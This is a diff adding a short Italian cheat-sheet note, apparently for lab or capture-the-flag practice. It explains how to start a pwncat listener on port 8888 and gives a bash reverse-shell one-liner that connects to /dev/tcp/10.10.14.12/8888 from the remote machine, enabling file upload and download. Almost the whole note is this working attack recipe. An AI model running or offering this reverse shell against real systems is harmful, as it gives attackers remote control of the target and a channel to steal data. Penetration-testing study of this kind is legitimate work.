@@ -1,0 +1,12 @@
+LINUX
+-----------------pwncat ottima shell--------------------------
+Vado in Tools/pwncat
+Entro nel virtual environment con
+-source pwncat-env/bin/activate
+E creo il server per usare pwncat
+python -m pwncat -lp 8888
+
+Nella macchina in remoto procedo con
+bash -c 'bash -i>& /dev/tcp/10.10.14.12/8888 0>&1'
+
+Dovrei aver ricevuto una shell in pwncat nel quale posso usare tutte le feature compreso download ed upload
